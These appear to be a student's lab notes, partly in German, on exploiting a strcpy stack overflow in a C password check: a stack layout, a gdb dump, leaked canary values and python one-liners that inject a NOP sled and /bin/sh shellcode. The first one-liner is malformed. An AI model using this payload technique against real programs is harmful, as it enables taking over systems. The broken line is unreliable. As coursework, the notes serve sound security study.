![[Pasted image 20230620115649.png]]


1. Nehmen wir an der Stack sieht folgendermaßen aus

^	char \*password
|	return adress
|	old ebp
|	char padded_password[28]
	

28xA + 8xA+ BADEAFFE

(gdb) x/40x $sp



464544434241

gef➤  x/40x $sp
0x7fffffffdce8:	0x555551fb	0x00005555	0x00000001	0x00000000
0x7fffffffdcf8:	0xffffe22b	0x00007fff	0x55554040	0x00005555
0x7fffffffdd08:	0xf7fe285c	0x00007fff	0x000007f0	0x00000000
0x7fffffffdd18:	0xffffe1d9	0x00007fff	0xf7fc1000	0x00007fff
0x7fffffffdd28:	0xa1e82a00	0x37fcbe3f	0xffffdd60	0x00007fff
0x7fffffffdd38:	0x55555298	0x00005555	0xffffde78	0x00007fff
0x7fffffffdd48:	0x00000064	0x00000002	0x00001000	0x00000000
0x7fffffffdd58:	0x555550e0	0x00005555	0x00000002	0x00000000
0x7fffffffdd68:	0xf7c29d90	0x00007fff	0x00000000	0x00000000
0x7fffffffdd78:	0x55555272	0x00005555	0xffffde60	0x00000002


Stack overflowed nach oben, also in Richtung der previous memory

0xDEADbEEF -> Beginn des Buffers {--> shellcode in buffer schreiben} 
0xdeadbfcf -> Ende des Buffer -> old ebp
0xdeadbfd7 --> return adress ->{ return adress overflown und auf 0xDeadbeef zeigen lassen }



/// DEBUG NOTE: start of function @ 0xC001D00D
int authenticate(char *password){
// first pad the password to hopefully avoid timing attacks
char padded_password [28];
if(sizeOf(password)>sizeOf(padded_password)){
	return 1;
}  
 
strcpy(padded_password , password);
// check the password
if (strcmp(padded_password , admin_pw) == 0) return 1;
	return 0;
}

**return 0 in the main function means that the program executed successfully.** **return 1 in the main function means that the program does not execute successfully and there is some error**. return 0 means that the user-defined function is returning false.




### Aufgabe 7 Stack canaries

0 0x00006953 
1 0x0001fb0c
2 0x08ba8b0e
3 0x000cf113
4 0x00016b28
5 0x70a367a9
6 0x0003a679
7 0x4bced1c1
8 0x000b1c41
9 0x00000999


echo $(python3 -c 'import("sys").stdout.buffer.write(b"\x41"16 + b"\xc1\xd1\xce\x4b" + b"\x41"12 + b"\x04\xd6\xff\xff" + b"\x41"*4 +  b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")')


https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection


 $(python3 -c '__import__("sys").stdout.buffer.write(b"\x41"*16 + b"\xc1\xd1\xce\x4b" + b"\x41"*12 + b"\xac\xd5\xff\xff" + b"\x90"*104 + b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")')


NOPS werden vor dem Shellcode eingefügt, da die Instruktionsadressen während des Ausführen steigen und der Stack von oben nach unten wächst. Somit müssen wir erst die NOPS overflown und anschließend den Shellcode.


https://security.stackexchange.com/questions/211534/should-the-shellcode-be-reversed-before-beeing-injected-in-a-simple-buffer-ove